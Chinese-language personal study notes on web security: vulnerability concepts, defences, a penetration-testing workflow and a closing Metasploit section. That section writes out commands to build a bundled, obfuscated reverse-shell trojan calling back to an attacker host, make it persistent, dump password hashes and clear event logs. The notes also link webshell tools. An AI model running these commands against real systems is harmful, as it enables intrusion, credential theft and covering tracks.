# WEB 網路安全-筆記

## WEB基礎名詞介紹
- 前端: 瀏覽器所看的的內容 (HTML、CSS、JS)
- 後端: 部屬在伺服器上的程序 (Php、Python、Nodejs...)
- 數據庫: 存放數據的容器 (MySQL、MongoDB...)
- 協議: 規定好的通訊、交流的方式 (http、https)
- 伺服器: 性能非常好的電腦 (可以同時處理多人訪問)
- WEB漏洞: 前端、後端、協議、數據庫產生問題
- IP地址: Internet Protocol Address 網路協議地址，全球唯一
- 端口: 0-65535 每一個軟體的一個通訊的進出口
- LAN: (Local Area Network)
    
    - 192.168.*.*
    - 172.16.*.*-172.31.*.*
    - 10.*.*.*

- WAN: (Metropolitan Area Network)
- URL: (Uniform Resource Location)統一資源定位符
- MAC地址: Media Access Control 介質訪問控制符，全球唯一
- 映射/端口映射: 將內網的IP地址(端口)轉變成外(公)網IP地址(端口)
- 域名/DNS: IP地址別名，透過DNS服務器將IP轉換成域名
- 網卡/網關
- IPv4/IPv6
- 瀏覽器: 訪問網頁的應用程式
- Linux/Windows: 管理硬體與軟體的操作系統(Operating System,OS)軟體
        
    - Linux多為命令行介面/Windows多為圖形介面

- 系統漏洞: 操作系統代碼出現BUG、漏洞
- 虛擬機/Docker: 虛擬一個操作系統(VMWare、VirtualBox...)，Docker為虛擬系統容器(應用軟體)
- 橋接/NAT: 虛擬機與主機是平級關係(同一個網段)/虛擬機與主機是父子關係
- Shell/webshell: Shell就是一個控制操作電腦的命令行介面/通過網頁行式控制操作電腦的命令行網頁介面
- 正向/反向Shell: 黑客主動連接受害者/受害者主動連接黑客
- 弱口令/字典/暴力破解: 強度比較弱的密碼(Ex:123456)/一系列的密碼/一個一個嘗試破解
- Cookie/Session: 數據存放在客戶端/數據存放在伺服器，都是保存狀態的文件或是數據
- ByPass: 繞過
- 0Day漏洞: 最新產生的漏洞
- 攻擊、入侵、滲透: 獲取目標的信息、Shell或是把目標打死
- DDOS: 拒絕服務攻擊
- 肉雞: 黑客已經攻擊佔領的電腦
- 代碼審計: 看代碼找漏洞、BUG，審計工具幫助安全人員快捷找BUG、漏洞
- CTF: Capture The Flag 奪旗賽，黑客殿堂賽事(線上)
- AWD: Attack With DefenCe 線下賽事
- 靶機: 搭建好的漏洞測試環境的電腦
- CMS: 內容管理系統、簡稱後台
- 滲透、攻擊工具: (Kali、sqlmap、Burpsuit...)，有需要再學還是須先了解原理
- 後滲透: 攻擊完後，建立持久訪問


## 初識WEB前端語言以及潛在漏洞

- 甚麼是HTML

    - Hyper Text Markup Language 超文本標記語言
    - 標籤皆以成對的方式編寫


- HTML潛在漏洞

    - 純HTML基本沒有漏洞
    - Iframe clickjack

- CSS 

    - Cascading Style Sheet: 層疊樣式表

- CSS潛在漏洞

    - 純CSS的漏洞幾本上也是沒有
    - 輸入框監測: https://github.com/maxchehab/CSS-Keylogging

- JavaScript

    - 一種腳本語言，可以將網頁實現複雜動態功能
    - 文件、HTML、DOM、cookie、數據操作等用途

- JavaScripts潛在漏洞

    - 純JS存在許多漏洞
    - XSS
    - 重要: 必學JS以及潛在漏洞

## 初識WEB後端語言及潛在漏洞

1. 甚麼是後端(Back-end)
    - 用戶無法直接看到，並在伺服器上運行的一個應用程式

2. 後端種類(語言)
    - PHP、JAVA、PYTHON、C/C++/C#...

3. 後端框架
    - 甚麼是框架: 快速開發、低耦合便於維護，類似在操作系統上面寫代碼
    - 例如: ThinkPhp、Django(Python)、Flask(Python)、SSH(JAVA)...

4. 後端有哪些潛在漏洞:
    - 權限鑑權
    - SQL注入
    - 邏輯漏洞
    - 其他漏洞

5. 自學內容
    - 學習框架

## SQL注入&繞過原理

1. 甚麼是SQL
    - SQL(Structured Query Language)結構化查詢語言，使我們有能力訪問數據庫

2. 甚麼是SQL注入
    - 用戶提交的數據可以被數據庫解析執行

3. 加強自學內容
    - 了解SQL語句
    - 透過SQL語句繞過資料庫執行漏洞

4. 補充: NoSQL注入

## XSS漏洞-跨站腳本漏洞

1. 甚麼是XSS
    - XSS(Cross Site Script)跨站腳本攻擊，網頁內嵌入HTML、CSS、JS代碼
    - 惡意攻擊者利用web頁面的漏洞，插入一些惡意代碼，當用戶訪問頁面的時候，代碼會被執行達到攻擊的目的

2. XSS類型
    - 反射型: 前端-> 後端 -> 前端
    - 儲存型: 前端 -> 後端 -> 資料庫 -> 前端
    - DOM型: 前端

3. XSS舉例:
    - 再輸入框輸入 ```<script>alert(1)</script>```
    - 進階: 綁定Beef轉換成監聽木馬

### http 請求方式
#### 常用
- GET: 請求伺服器獲取資源
- HEAD: 類似GET，但不會返回實體數據，只會獲取回報頭(header)
- POST: 向伺服器提交數據
- PUT: 替換伺服器內容

#### 不常用
- DELETE: 請求伺服器刪除指定的資源
- TRACE: 對鏈結路進行診斷測試
- OPTIONS: 列出可對資源實行的操作方式，Allow字段裡返回
- CONNECT: 請求伺服器與另一台伺服器建立連接，充當代理

#### 擴展
- MKCOL、COPY、MOVE、UNLOCK、PATCH

### http特點
- 請求(request)/應答(response)模式
- 靈活可擴展
- 可靠傳輸: TCP/IP 傳輸
- 無狀態(stateless)

### 客戶端 Cookie 特性
1. 明文
2. 可修改
3. 大小受限 (視瀏覽器而定)
4. 不能跨域名使用

### 伺服器端 Session
- 基於cookie 將資料儲存至Session中，透過獲取sessionID後，將資料回傳

### Javascripts 操作 cookie
1. 如何遠程獲取其他用戶的cookie
    #### Javascripts語法:
    - 獲取: document.cookie
    - 設置: document.cookie = "(key=value)"
    - 修改: document.cookie = "(key=new value)"
    - 刪除:

    #### 腳本注入網頁 XSS

### XSS漏洞檢測工具
- XSSER: https://xsser.03c8.net/

- XSStrike: https://github.com/s0md3v/xsstrike

### XSS 防禦方法
- WAF(WEB APPLICATION FIREWALL): ModSecurity 

- ModSecurity開源: https://github.com/owasp-modsecurity/ModSecurity

## CSRF漏洞原理

### 甚麼是CSRF
    - CSRF(Cross Site Request Forgery)跨站請求違造，攻擊者盜用你的身份，以你的名義發送惡意請求

### 造成危害
    - 修改帳戶訊息
    - 利用管理員帳號、上傳木馬
    - 傳播蠕蟲病毒(點擊 -> 擴散 -> 點擊)
    - 配合其他攻擊手段，實現攻擊(Ex: XSS、SQLi)

### CSRF漏洞挖掘工具
- Burp Suite
- CSRF Tester
- 開源Python 腳本: https://github.com/s0md3v/Bolt

### 防禦思路
1. 區分請求是來自於網站本身的前端 or 第三方網站 發起的
- HTTP Request Header -> Referer 字段:
    - 引用頁、引薦、來源頁面
    - 作用: 跟蹤來源、訪問統計、廣告效果
    - referer不足: 1. HTTP的請求都是可以修改的 2. 可以為空

2. 讓網站本身的前端/偽造的請求變得不一樣
- CSRF Token: 再請求中加入一些隨機字段(第三方不知道也猜不出來)，讓第三方網站無法偽造請求
    1. 用戶使用帳號密碼登入，伺服器下發一個隨機的token給客戶端，並將其保存在Session中
    2. 客戶端把這個token保存起來，放在影藏字段
    3. 用戶在登入的狀態下，在之後訪問的時候，都要攜帶token字段
    4. 服務端從session中拿出token值進行比對，如果一致代表請求合法
    5. 用戶退出，session銷毀，token失效

3. 更安全的方法
    - 加入二次驗證 (輸入舊密碼、加入驗證碼)

## WEBCAM入侵原理
- 結合網路以及攝影機技術所產生的新一代攝影機，其實只要連線上網路的設備滲透原理基本上都是相通的

### 如何發掘
    - 搜尋活耀IP
    - 端口掃描
    - 指紋篩選
    - 暴力破解、字典破解 

## 代碼審計漏洞

1. 甚麼是代碼審計
    - 透過檢查源代碼發現發現源代碼缺陷引發的安全漏洞

2. 提升方向
    - 熟悉編程語言
    - 熟悉風險代碼操作
    - 熟悉設計模式

## 文件上傳漏洞

### 文件上傳漏洞原理
- 用戶上傳了一個可執行腳本漏洞文件，並且透過執行腳本文件獲得執行伺服器端命令的能力

### 常見操作
- 一句話木馬(Php文件)
    - 特點: 代碼短，只有一行代碼，運用場景多，可以單獨生成文件，也可以插入到圖片中。安全性高，隱匿性強，可變形免殺。

- 小馬
    - 特點: 體積小、功能少、只有上傳文件功能

- 大馬
    - 特點: 體積大、功能全，能夠管理數據庫、文件管理、對站點進行快速的訊息收集，甚至能夠提權

### 工具
- webshell 開源github: https://github.com/tennc/webshell
- 網站控制工具: 
    - 中國蟻劍: https://github.com/AntSwordProject/antSword
    - weevely: https://github.com/epinna/weevely3
    - 哥斯拉 godzilla: https://github.com/BeichenDream/Godzilla
    - 冰蠍 behinder: https://github.com/rebeyond/Behinder
- 代理抓包工具 BurpSuite: 
- 漏洞發現工具: https://github.com/almandin/fuxploider

### 文件上傳靶場練習
- https://www.youtube.com/watch?v=UvJmlePQDG0&list=PLLoeRTvFkQhs_BFrlc-mlOVp7omTitbWq&index=22

### 危害
- 伺服器植入黑鏈
- 挖礦
- 敏感訊息洩漏

### 漏洞利用流程
1. 找到上傳位置
2. 嘗試繞過校驗並上傳文件
3. 獲取文件位置
4. 工具連接，管理文件

### 防禦方法
- 擴展名(後贅)黑白名單
- MIME類型校驗 (image/gif)
- 對文件內容進行二次渲染
- 對上傳的文件重命名，不易被猜到
- 不要暴露上傳文件的位置
- 禁用上傳文件的執行權限

## 文件包含漏洞

### 文件包含漏洞原理
- 一個代碼文件需要去包含其他的代碼文件導致的漏洞
    1. 產生原因:
        - 內容包含: Ex: 網頁導航、footer重複利用
        - 函數包含
        
    2. 分類:
        - 本地: (Local File Inclusion, LFI) -> 目錄遍歷漏洞/任意文件訪問漏洞
            - 固定文件名
            - 通過接口動態包含
            - 包含惡意代碼、圖片碼 -> 獲得Shell
            - 包含敏感文件
        - 遠程: (Remote Flie Inclusion，RFI)

    3. 相關函數和偽協議:
        - Php: https://www.youtube.com/watch?v=M3yyTlxtGps&list=PLLoeRTvFkQhs_BFrlc-mlOVp7omTitbWq&index=29

### 文件包含漏洞挖掘與利用
- 漏洞挖掘
    - url關鍵字: page、file、filename、include
    - url參數: xxx.php、 xxx.html 例如: ?file=xxx、 ?page= 、 ?home=

- 文件包含漏洞利用工具: https://github.com/D35m0nd142/LFISuite

### 修復
1. PHP配置文件 -> 關掉遠端包含文件
2. 禁用動態包含
3. 過濾協議、 目錄字符
4. 設置文件白名單

## SSRF漏洞

### SSRF原理
- SSRF(Server-Side Request Forgery)服務端請求偽造，是一種由攻擊者構造攻擊鏈傳給伺服器，服務端執行併發請求造成的安全漏洞，一般用來內網探測或攻擊內網服務

## XXE漏洞

### XXE原理
- XXE: XML External Entity Injection 即XML外部實體注入漏洞，XXE漏洞發生應用程序解析XML輸入時，沒有禁止外部實體的加載，導致可加載惡意外部文件，造成文件讀取、命令執行、內網端口掃描、攻擊內網網路、甚至發起DOS攻擊等危害

## 反序列化漏洞
- 尚未學習(待補上): https://www.youtube.com/watch?v=nYIJMJaj7vg&list=PLLoeRTvFkQhs_BFrlc-mlOVp7omTitbWq&index=34

## 信息洩漏
- 分類:
    - 敏感信息
    - URL: Ex: ?file=、 ?id= ...
    - 帳號密碼
    - 網站原碼
    - 資料庫備份

## 常用工具介紹

### 抓包工具-BurpSuite



## 參考資料
- https://www.youtube.com/playlist?list=PLgZqc0esdeS-NJms7NYexeMHKLpfAi5HY

- WEB 結合 AI: https://ithelp.ithome.com.tw/users/20168631/ironman/8630

# 實戰流程

## 1. 信息收集

### 基礎信息
- IP、網段、端口、域名
- DNS信息
    - nslookup
    - clig
- 域名信息收集
    - whois
    - 備案
    註冊人/MAIL反查
- 子域名信息收集
    - google hacking
    - 第三方網站
    - 網路空間搜尋引擎: shodan
    - https tls 證書信息
    - 子域名爆破工具: OneForAll
- 端口信息收集
    - nmap
- 系統信息
- 應用信息
- 版本信息
- 人員信息
- 防護信息

### 網站信息
- 指紋辨識
- 敏感文件、目錄
- Waf識別

## 2. 漏洞探測
- 系統漏洞
- web漏洞
- 中間件漏洞
- 端口服務漏洞
- 業務邏輯漏洞
- 通信安全

## 3. 滲透攻擊
- 根據探測到的信息整理漏洞合集表
- 分析並驗證端口、服務、應用漏洞
- 尋找攻擊路徑進入內網，擴大影響
- 活動訪問權限

## 4. 後滲透
- 內網信息收集
- 內網反彈shell
- 內網穿透
- 提權
- 橫向移動
- 權限維持
- 痕跡清除

## 5. 信息整理
- 整理滲透工具
- 整理蒐集訊息
- 整理漏洞信息

## 6. 滲透報告
- 按需整理
- 補充介紹
- 加固建議

## 環境與工具準備

### 環境配置
- 建議: (攻擊)VMWare -> Kali Linux(常用工具都已經安裝好了)



# Metasploit
- kali Linux 自帶的後門木馬管理工具

## 操作流程

### 1. 啟動Metasploit
```cmd
msfconsole
```
- -q 省略開啟時的文字訊息

### 2. 使用模組
```cmd
use exploit/multi/handler
```
- 可以透過 show options 展示當前配置

### 3. 設置模組
```cmd
set lhost ip
set lport port (默認4444)
set payload (payload)
set exitonsession false: 支持多線呈操作
```
- 透過 show payloads 展示所有可用payload

### 4. 製作木馬
```cmd
msfvenom -p windows/x64/meterpeter/reverse_tcp -f exe -a x64 --platform windows -o ./demo.exe lhost=ip lport=port 
```
- -p: payload 使用的漏洞
- -f: file 輸出格式
- -o: output 輸出路徑
- -x: 綑綁文件路徑(綑綁正常文件，當目標使用該檔案後就會開啟程序)
- -k: Keep 維持原綑綁文件功能，同時間執行木馬程序
- -e: encoder 利用混淆器
- -i: 混淆次數
- payload、lhost、lport必須與設置的一樣
- msfvenom -h: 協助文件
- msfvenom -l (預查詢指令): 將需要查詢的命令list值

    #### todo: 製作自動化木馬生成工具
    - 參考資料: https://www.youtube.com/watch?v=40yitejayBQ&list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5&index=4

    #### 補充-DLL劫持
    - https://www.youtube.com/watch?v=9V-Z1PPuVcg&list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5&index=8

### 5. 啟動監聽
```cmd
run 
```
- run -j: 背景監聽
- jobs: 顯示當前上線啟用程序的電腦列表(後臺監聽)
- jobs -h: 操作命令列表
- session -i (id): 選中操控的電腦(透過id)
- background/bg: 退出選中回到背景
- jobs -K: 關閉監聽

### MSF木馬持久化
- show advanced: 顯示高級指令
- 第一次連線完成後: 出現 meterpreter > 後執行以下指令
```cmd
run persistence -X -i 5 -p 4444 -r (ip)
```
- -X: 開機後自動啟動木馬
- -i: 目標每隔幾秒自動連線
- -p: 自動連接的監聽端口
- -r: 自動連接到的監聽IP

## 連線後操作
- help: 列出全部操作指令
- getsystem: 提權 / rev2self: 改回使用者權限
    - run post/windows/gather/hashdump: dump該裝置目前使用者權限以及密碼 hash值
- ps: 顯示當前目標正在執行的進程
- migrate (PID): 將木馬轉移至PID進程
- 離開操作前記得把日誌刪掉: clearev 指令
- portfwd: 端口轉發，將目標機台的某個端口轉到其他設備端口連接

## MSF連接多個木馬
- sessions: 觀看當前有多少電腦啟用程序


### 參考資料: 
- https://www.youtube.com/playlist?list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5

- android 14+ apk綑綁: https://medium.com/@elijahchimera01/embedding-metasploit-payloads-into-legit-android-apps-ad75ab6199c6

- 安裝 apktool 最新版本: https://www.youtube.com/watch?v=adwFmvzM2iQ 

## MSF漏洞掃描
1. search (naem): 搜尋漏洞名稱
2. use (name): 使用該漏洞
3. show options & set: 設置漏洞必要參數
4. check: 確認目標是否存在該漏洞
4. run

### stage & stager
- https://www.youtube.com/watch?v=F1EmVLmDIcc&list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5&index=21

### 後滲透 (Post)
- 必須已滲透後執行的指令
```cmd
run (post module)
```